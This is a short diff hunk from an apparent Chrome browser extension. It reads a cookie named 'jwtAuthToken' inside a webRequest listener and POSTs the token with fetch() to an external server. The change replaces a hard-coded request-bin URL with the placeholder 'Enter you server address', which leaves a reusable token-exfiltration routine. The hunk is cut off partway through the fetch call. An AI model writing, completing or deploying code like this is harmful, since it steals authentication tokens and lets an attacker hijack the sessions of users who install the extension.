@@ -10,7 +10,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
           if (cookie.name === 'jwtAuthToken') {  
             const jwtToken = cookie.value;
 
-            fetch('https://en8j18kbxp2tl.x.pipedream.net/', {
+            fetch('Enter you server address', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
